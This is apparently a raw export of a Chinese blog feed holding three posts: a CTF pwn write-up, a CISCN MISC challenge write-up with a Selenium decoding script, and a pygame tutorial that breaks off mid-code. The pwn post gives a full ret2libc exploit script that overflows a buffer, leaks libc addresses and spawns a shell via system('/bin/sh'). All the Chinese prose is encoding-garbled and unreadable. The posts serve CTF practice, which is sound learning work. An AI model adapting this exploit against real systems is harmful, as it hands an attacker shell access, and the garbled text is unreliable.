class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>p64(ret_addr)ï¼šç›®çš„æ˜¯è®©å †æ ˆå¯¹é½</p><h1 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25488)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">start_addr=elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400c83</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">payload1=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b  main&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.info(<span class="string">&#x27;puts_addr==&gt;%#x&#x27;</span>,puts_addr)</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> libcbase</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b  main&#x27;)</span></span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">ret_addr=<span class="number">0x4006b9</span></span><br><span class="line">payload2=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCNå¤ç°</title>
      <link href="/post/CISCN%E5%A4%8D%E7%8E%B0.html"/>
      <url>/post/CISCN%E5%A4%8D%E7%8E%B0.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åˆæ¬¡å‚åŠ è¿™ç§å¤§å‹æ¯”èµ›ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯é¢˜ç›®å‡ºçš„æŒºä¸é”™ï¼ˆä¸€é¢˜éƒ½æ²¡åšå‡ºæ¥ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªæ¯”èµ›å½¢å¼ç€å®ä»¤äººä¸è§£ã€‚ä¸ä»…å¦‚æ­¤ï¼Œåœ¨å†™å®Œé€‰æ‹©é¢˜åç³»ç»Ÿå´©æºƒä¹Ÿæ˜¯æˆ‘æ²¡æƒ³å¾—åˆ°ï¼ˆè™½ç„¶æ²¡æœ‰åœæ»å¾ˆä¹…ï¼Œä½†æ˜¯æ„Ÿè§‰å¾ˆæ„å¤–ï¼Œæ¯•ç«Ÿæ˜¯å›½èµ›ï¼‰ã€‚</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="éš”ç©ºä¼ è¯"><a href="#éš”ç©ºä¼ è¯" class="headerlink" title="éš”ç©ºä¼ è¯"></a>éš”ç©ºä¼ è¯</h2><p>é™„ä»¶æ˜¯ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢å…¨æ˜¯åå…­è¿›åˆ¶ç ï¼Œæ ¹æ®é¢˜ç›®æœç´¢å‘ç°æ˜¯<a href="http://www.sendsms.cn/pdu/"><strong>PDUç¼–ç è§£ç </strong></a>ï¼Œè§£ç å‘ç°å‰é¢å››è¡Œå¾—åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼šflagå‰é¢ä¸€éƒ¨åˆ†æ˜¯15030442å’Œw465ã€‚è€Œåé¢åˆ™æ˜¯ä¸€å †åå…­è¿›åˆ¶ç ï¼Œä½†æ˜¯å‘ç°åœ¨ç¬¬ä¸€è¡Œåå…­è¿›åˆ¶ç çš„å¼€å¤´å‡ ä¸ªåå…­è¿›åˆ¶ç æ­£å¥½æ˜¯pngåå…­è¿›åˆ¶æ–‡ä»¶å¤´ï¼ŒçŒœæµ‹è¿™äº›åº”è¯¥æ˜¯pngå›¾ç‰‡çš„åå…­è¿›åˆ¶ç ï¼Œåˆ©ç”¨è„šæœ¬å°†å…¶å¯¼å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€è¯»å–data.txtæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = data.splitlines()[<span class="number">4</span>:]  <span class="comment"># å‰å››æ¡ä¸æ˜¯åå…­è¿›åˆ¶</span></span><br><span class="line"><span class="comment"># å¯åŠ¨è°·æ­Œ</span></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&quot;http://www.sendsms.cn/pdu/&quot;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">output = <span class="string">&#x27;&#x27;</span>  <span class="comment"># ç”¨äºæ¥æ”¶ç»“æœ</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    browser.find_element_by_name(<span class="string">&quot;smsText2&quot;</span>).clear()  <span class="comment"># æ¸…ç©ºè½¬æ¢æ¡†é‡Œé¢çš„å†…å®¹</span></span><br><span class="line">    browser.find_element_by_name(<span class="string">&quot;smsText2&quot;</span>).send_keys(i)  <span class="comment"># è¾“å…¥è¦ç¿»è¯‘çš„å†…å®¹</span></span><br><span class="line">    browser.find_element_by_xpath(<span class="string">&quot;//input[@name=&#x27;checkButton&#x27;]&quot;</span>).click()  <span class="comment"># ç‚¹å‡»ç¿»è¯‘</span></span><br><span class="line">    recv = browser.find_element_by_name(<span class="string">&quot;smsOut&quot;</span>).get_attribute(<span class="string">&#x27;value&#x27;</span>)  <span class="comment"># è·å–ç¿»è¯‘å†…å®¹</span></span><br><span class="line">    recv = recv.split()  <span class="comment"># å°†è·å¾—å†…å®¹æŒ‰ç©ºæ ¼åˆ†å¼€</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    txt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> recv:  <span class="comment"># è¯»å–éœ€è¦çš„ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">3</span>:  <span class="comment"># è·å–æ—¶é—´æˆ³</span></span><br><span class="line">            txt += j</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">13</span>:</span><br><span class="line">            txt += j  <span class="comment"># è·å–åå…­è¿›åˆ¶ç </span></span><br><span class="line">            txt += <span class="string">&#x27;\n&#x27;</span>  <span class="comment"># åˆ†è¡Œ</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    output += txt</span><br><span class="line">browser.quit()  <span class="comment"># é€€å‡ºæµè§ˆå™¨</span></span><br><span class="line">output = output.splitlines()</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">time = []</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:  <span class="comment"># æŒ‰æ—¶é—´æˆ³è¿›è¡Œæ’åº</span></span><br><span class="line">    time.append(<span class="built_in">int</span>(i[<span class="number">3</span>:<span class="number">5</span>]) * <span class="number">60</span> + <span class="built_in">int</span>(i[<span class="number">6</span>:<span class="number">8</span>]) - <span class="number">1800</span>)</span><br><span class="line">    data.append(i[<span class="number">8</span>:])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i == time[j]:</span><br><span class="line">            result += data[j]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># å°†ç»“æœä¿å­˜åˆ°out.txtæ–‡ä»¶ä¸­</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯¼å‡ºå›¾ç‰‡ï¼Œå‘ç°å›¾ç‰‡ä¹±ä¸ƒå…«ç³Ÿï¼Œæƒ³åˆ°ä¹‹å‰w465åº”è¯¥æ˜¯width465è½¬æˆåå…­è¿›åˆ¶ç å°±æ˜¯1D1ï¼Œå¾—åˆ°å›¾ç‰‡</p><p><img src="https://i.loli.net/2021/05/18/du2PwMJRpSQLDyW.png" alt="æœªå‘½å_1_.png"></p><p>ç»“åˆå‰é¢å¾—åˆ°flagï¼šCISCN{15030442_b586_4c9e_b436_26def12293e4}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pygameä½¿ç”¨</title>
      <link href="/post/pygame%E4%BD%BF%E7%94%A8.html"/>
      <url>/post/pygame%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>äº†è§£ï¼Œå­¦ä¹ ä¸€ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œæœ€å¥½æ˜¯å»å®˜ç½‘å­¦ä¹ ï¼Œå› ä¸ºå®˜æ–¹æœ‰ç¬¬ä¸€æ‰‹èµ„æ–™ï¼Œè€Œåœ¨å…¶ä»–äººæ‰‹é‡Œåˆ™æ˜¯ç¬¬äºŒæ‰‹ï¼Œä½¿ç”¨è¦å­¦å¥½è¿˜æ˜¯å¾—å»<a href="https://www.pygame.org/wiki/GettingStarted">å®˜ç½‘</a>ã€‚åœ¨è¿™é‡Œæˆ‘å°±ç›´æ¥æ‹¿å®ä¾‹è®²pygame</p></blockquote><h1 id="å®‰è£…pygame-windows"><a href="#å®‰è£…pygame-windows" class="headerlink" title="å®‰è£…pygame (windows)"></a>å®‰è£…pygame (windows)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -U pygame --user</span><br></pre></td></tr></table></figure><p>å¯èƒ½çš„æŠ¥é”™ï¼š</p><ul><li>è¾“å…¥pythonå¯èƒ½ä¼šæŠ¥é”™ï¼Œæ”¹æˆpython3</li><li>æ— æ³•ä¸‹è½½ï¼Œæ£€æŸ¥ç½‘ç»œæ˜¯å¦æ­£å¸¸ï¼Œç¡®è®¤æ— è¯¯è¿˜æ˜¯æ— æ³•ä¸‹è½½ï¼ŒæŸ¥çœ‹æ˜¯å¦ä½¿ç”¨äº†æ¢¯å­ï¼Œå¦‚æœä½¿ç”¨å°±å…³é—­ã€‚</li></ul><h1 id="è®¾è®¡æ€è·¯"><a href="#è®¾è®¡æ€è·¯" class="headerlink" title="è®¾è®¡æ€è·¯"></a>è®¾è®¡æ€è·¯</h1><p>è®¾è®¡ä¸€ä¸ªæ¸¸æˆå¿…é¡»å…ˆæœ‰æ€è·¯ï¼Œè¿™é‡Œæˆ‘å¼•ç”¨äº†ä¸€ä¸ªå¤§ä½¬çš„å›¾ç‰‡ï¼ŒåŸºæœ¬æ€è·¯å·®ä¸å¤šï¼Œæ¥ä¸‹æ¥å°±æ ¹æ®è¿™ä¸ªæ€è·¯å¼€å§‹è®¾è®¡è¿™ä¸ªæ¸¸æˆ</p><p><img src="https://i.loli.net/2021/05/12/jgWlDs5pc1rQUVN.png" alt="å›¾ç‰‡é“¾æ¥https://blog.csdn.net/weixin_45634606/article/details/105574019"></p><p>é¦–å…ˆï¼Œåœ¨è®¾è®¡æ—¶è¦æ˜ç¡®æ¸¸æˆæœ‰å“ªäº›å…ƒç´ ï¼Œä»è€Œåˆ›å»ºå¯¹åº”çš„ç±»ã€‚åœ¨é£æœºå¤§æˆ˜ä¸­ï¼Œè¦åˆ›å»ºä»¥ä¸‹å‡ ä¸ªç±»ï¼š</p><ul><li><p>ç”¨äºç®¡ç†æ¸¸æˆèµ„æºå’Œè¡Œä¸ºçš„ç±»ï¼ˆæˆ‘æ˜¯å°†å®ƒæ”¾åœ¨alien_invasion.pyæ–‡ä»¶ä¸­ï¼Œä½œä¸ºæ¸¸æˆçš„å…¥å£ï¼‰</p></li><li><p>å­˜å‚¨æ¸¸æˆè®¾ç½®çš„ç±»ï¼ˆsettings.pyï¼‰</p></li><li><p>å­˜å‚¨é£æœºçš„ç±»ï¼ˆship.pyï¼‰</p></li><li><p>å­˜å‚¨å­å¼¹çš„ç±»ï¼ˆbullet.pyï¼‰</p></li><li><p>å­˜å‚¨æ•Œæœºçš„ç±»ï¼ˆAlien.pyï¼‰</p></li><li><p>å­˜å‚¨æ¸¸æˆåˆå§‹æ•°æ®çš„ç±»ï¼ˆgame_stats.pyï¼‰</p></li><li><p>å­˜å‚¨å¾—åˆ†çš„ç±»ï¼ˆscoreboard.pyï¼‰</p></li><li><p>å­˜å‚¨åˆå§‹æ¸¸æˆç•Œé¢çš„ç±»ï¼ˆbottom.pyï¼‰</p><h1 id="alien-invasion-py"><a href="#alien-invasion-py" class="headerlink" title="alien_invasion.py"></a>alien_invasion.py</h1><p>é¦–å…ˆè¦åˆå§‹åŒ–è¦æ˜¾ç¤ºçš„çª—å£æˆ–å±å¹•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlienInvasion</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span>                            </span><br><span class="line">        pygame.init()                                                                                   <span class="comment">#pygame.init()å®‰å…¨åœ°åˆå§‹åŒ–äº†æ‰€æœ‰å¯¼å…¥çš„pygameæ¨¡å—</span></span><br><span class="line">        self.screen = pygame.display.set_mode((<span class="number">1200</span>,<span class="number">800</span>))         <span class="comment">#åˆå§‹å±å¹•ï¼Œ1200æ˜¯å±å¹•å®½åº¦ï¼Œ800æ˜¯å±å¹•é«˜åº¦</span></span><br><span class="line">        pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)                      <span class="comment">#åœ¨å±å¹•è¾¹æ¡†ä¸Šé¢æ·»åŠ æ¸¸æˆåAlien Invasion</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_game</span>(<span class="params">self</span>):</span>                                                                         <span class="comment">#æ¸¸æˆä¸»å¾ªç¯ï¼Œè®©æ¸¸æˆä¸æ–­æŒç»­ä¸‹å»</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">                <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:                                          <span class="comment"># å¦‚æœç”¨æˆ·è¾“å…¥qæ¸¸æˆå°±ç»“æŸ</span></span><br><span class="line">                    sys.exit()</span><br><span class="line">            pygame.display.flip()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    ai = AlienInvasion()</span><br><span class="line">    ai.run_game()</span><br></pre></td></tr></table></figure><p><strong>ç›¸å…³ä»£ç è§£é‡Š</strong>ï¼š</p><p>**if __ name __ == â€˜ __ main <strong>ï¼š â€˜**ï¼š</strong> name __ æ˜¯å½“å‰æ¨¡å—åï¼Œå½“æ¨¡å—è¢«ç›´æ¥è¿è¡Œæ—¶æ¨¡å—åä¸º __ main __ ã€‚è¿™å¥è¯çš„æ„æ€å°±æ˜¯ï¼Œå½“æ¨¡å—è¢«ç›´æ¥è¿è¡Œæ—¶ï¼Œä»¥ä¸‹ä»£ç å—å°†è¢«è¿è¡Œï¼Œå½“æ¨¡å—æ˜¯è¢«å¯¼å…¥æ—¶ï¼Œä»£ç å—ä¸è¢«è¿è¡Œã€‚ï¼ˆå¦‚æœè¿˜æ˜¯æœ‰ç–‘æƒ‘æŸ¥çœ‹<a href="https://www.sohu.com/a/426575177_671965">é“¾æ¥</a>ï¼‰</p><p><strong>for event in pygame.event.get()ï¼š</strong>Pygameä¼šæ¥å—ç”¨æˆ·çš„å„ç§æ“ä½œï¼ˆæ¯”å¦‚æŒ‰é”®ç›˜ï¼Œç§»åŠ¨é¼ æ ‡ç­‰ï¼‰äº§ç”Ÿäº‹ä»¶ï¼Œäº‹ä»¶éšæ—¶å¯èƒ½å‘ç”Ÿï¼Œè€Œä¸”é‡ä¹Ÿå¯èƒ½ä¼šå¾ˆå¤§ï¼ŒPygameçš„åšæ³•æ˜¯æŠŠä¸€ç³»åˆ—çš„äº‹ä»¶å­˜æ”¾ä¸€ä¸ªé˜Ÿåˆ—é‡Œï¼Œé€ä¸ªçš„å¤„ç†ã€‚è¿™è¡Œä»£ç å°±æ˜¯å°†äº‹ä»¶é€ä¸€è¯»å–ã€‚</p><h1 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h1><p>å­˜å‚¨æ¸¸æˆå…ƒç´ å±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Settings</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen_width = <span class="number">1200</span>                 <span class="comment">#å±å¹•å®½åº¦</span></span><br><span class="line">        self.screen_height = <span class="number">600</span>                 <span class="comment">#å±å¹•é«˜åº¦</span></span><br><span class="line">        self.bg_color = (<span class="number">230</span>, <span class="number">230</span>, <span class="number">230</span>)      <span class="comment">#èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">        self.ship_speed = <span class="number">1.5</span>                      <span class="comment">#é£èˆ¹ç§»åŠ¨é€Ÿåº¦</span></span><br><span class="line">        self.bullet_speed = <span class="number">1.5</span>               <span class="comment">#å­å¼¹é€Ÿåº¦</span></span><br><span class="line">        self.bullet_width = <span class="number">3</span>                  <span class="comment">#å­å¼¹å®½åº¦</span></span><br><span class="line">        self.bullet_height = <span class="number">15</span>                 <span class="comment">#å­å¼¹é•¿åº¦</span></span><br><span class="line">        self.bullet_color = (<span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span>)        <span class="comment">#å­å¼¹é¢œè‰²</span></span><br><span class="line">        self.bullet_allowed = <span class="number">5</span>                <span class="comment">#å­å¼¹æ•°é‡</span></span><br><span class="line">        self.alien_speed = <span class="number">1.0</span>                 <span class="comment">#å¤–æ˜Ÿäººç§»åŠ¨é€Ÿåº¦</span></span><br><span class="line">        self.fleet_drop_speed = <span class="number">10</span>           <span class="comment">#å¤–æ˜Ÿäººè®¾ç½®</span></span><br><span class="line">        self.fleet_direction = <span class="number">1</span>               <span class="comment">#1æ˜¯å³ç§»ï¼Œ-1æ˜¯å·¦ç§»åŠ¨</span></span><br><span class="line">        self.ship_limit = <span class="number">3</span>                           <span class="comment">#è®¾ç½®ç”Ÿå‘½æ¬¡æ•°</span></span><br><span class="line">        self.speedup_scale = <span class="number">1.1</span>               <span class="comment">#æ¸¸æˆè¿è¡Œçš„é€Ÿåº¦</span></span><br><span class="line">        self.score_scale = <span class="number">1.5</span>                    <span class="comment">#æ ¹æ®æ¸¸æˆé€Ÿåº¦æé«˜å¤–æ˜Ÿäººçš„åˆ†æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize_dynamic_settings</span>(<span class="params">self</span>):</span>                              <span class="comment">#åˆå§‹åŒ–åœ¨æ•´ä¸ªæ¸¸æˆä¸­æ›´æ”¹çš„è®¾ç½®</span></span><br><span class="line">        self.ship_speed = <span class="number">1.5</span>                                                         <span class="comment">#é£èˆ¹ç§»åŠ¨é€Ÿåº¦</span></span><br><span class="line">        self.bullet_speed = <span class="number">3.0</span>                                                     <span class="comment">#å­å¼¹ç§»åŠ¨é€Ÿåº¦</span></span><br><span class="line">        self.alien_speed = <span class="number">1.0</span>                                                       <span class="comment">#å¤–æ˜Ÿäººç§»åŠ¨é€Ÿåº¦</span></span><br><span class="line">        self.fleet_direction = <span class="number">1</span>                                                       <span class="comment">#å¤–æ˜Ÿäººç§»åŠ¨æ–¹å‘</span></span><br><span class="line">        self.alien_points = <span class="number">50</span>                                                         <span class="comment">#æ¯ä¸ªå¤–æ˜Ÿäººçš„åˆ†æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increase_speed</span>(<span class="params">self</span>):</span>                                                                       <span class="comment">#æé«˜é€Ÿåº¦è®¾ç½®å’Œå¤–æ˜Ÿäººåˆ†æ•°</span></span><br><span class="line">        self.ship_speed *= self.speedup_scale</span><br><span class="line">        self.bullet_speed *= self.speedup_scale</span><br><span class="line">        self.alien_speed *= self.speedup_scale</span><br><span class="line"></span><br><span class="line">        self.alien_points = <span class="built_in">int</span>(self.alien_points * self.score_scale)</span><br></pre></td></tr></table></figure><h1 id="ship-py"><a href="#ship-py" class="headerlink" title="ship.py"></a>ship.py</h1></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plane</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,ai_game</span>):</span></span><br><span class="line">        <span class="comment"># åˆå§‹åŒ–å°é£æœºå¹¶è®¾ç½®å…¶åˆå§‹ä½ç½®</span></span><br><span class="line">        self.screen = ai_game.screen                                                              <span class="comment">#åŠ è½½å›¾åƒï¼Œå¹¶è·å¾—å…¶çŸ©å½¢åŒºåŸŸ</span></span><br><span class="line">        self.settings = ai_game.settings                                                         <span class="comment">#è¯»å–è®¾ç½®é‡Œé¢çš„ä¿¡æ¯</span></span><br><span class="line">        self.img_plane = pygame.image.load(<span class="string">&quot;images/ship.bmp&quot;</span>)          <span class="comment">#åŠ è½½é£èˆ¹ç…§ç‰‡</span></span><br><span class="line">        self.screen_rect = ai_game.screen.get_rect()                              <span class="comment">#å¾—åˆ°é£èˆ¹çš„çš„çŸ©å½¢åŒºåŸŸ</span></span><br><span class="line">        